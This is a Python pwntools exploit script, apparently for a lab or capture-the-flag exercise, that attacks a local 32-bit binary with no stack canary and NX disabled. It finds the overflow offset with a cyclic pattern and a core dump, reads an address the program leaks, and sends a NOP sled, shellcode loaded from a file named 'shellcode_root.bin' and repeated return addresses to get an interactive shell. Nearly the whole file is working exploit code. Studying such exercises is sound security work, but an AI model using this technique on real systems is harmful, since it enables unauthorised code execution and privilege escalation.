#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./a.out
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./a.out')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments

io = start()

# find the offset
io.sendline(cyclic(500, n=4))
io.wait() #wait until tube is closed and coredump file is generated

core = Coredump('./core')
offset = cyclic_find(core.read(core.esp, 8), n=8)
print(f'offset = {offset}')

# open next tube
io = start()

io.recvuntil(' at ')
address = int(io.recvline(False), 16)
repeat_ret_address = p32(address)*5

f = open("shellcode_root.bin","rb")
shellcode_user = f.read()
f.close()


sled_len = offset - len(repeat_ret_address)-len(shellcode_user)
NOPSled = b'\x90'*sled_len # asm('nop')
io.sendline(NOPSled+shellcode_user+repeat_ret_address)

io.interactive()



